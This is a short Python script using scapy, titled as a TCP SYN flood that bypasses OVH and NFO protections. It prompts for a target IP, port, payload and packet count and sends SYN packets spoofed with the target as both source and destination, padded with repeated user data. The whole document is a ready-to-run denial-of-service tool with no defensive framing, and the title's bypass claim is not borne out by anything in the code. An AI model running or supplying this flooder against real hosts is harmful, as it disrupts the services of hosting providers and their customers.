# TCP SYN FLOOD (OVH & NFO BYPASS)

import socket, threading
from scapy.all import *

def main():
    count       = 0

    target      = input("Target IP: ")
    target_port = input("Target Port: ")
    data        = input("Data to be sent with packets: ")
    amount      = input("Amount of packets: ")

    target_ip   = socket.gethostbyname(target)

    for count in range(int(amount)):
        ip      = IP(src=target_ip, dst=target_ip) 
        tcp     = TCP(sport=RandShort(), dport=int(target_port), flags="S")
        raw     = Raw(data*1024)
        p       = ip / tcp / raw
        send(p, loop=0, verbose=0)
        count   = count + 1

    print("\nTotal packets sent: %i\n" % count)

if __name__ == "__main__":
    t = threading.Timer(1, main, ())
    t.start()
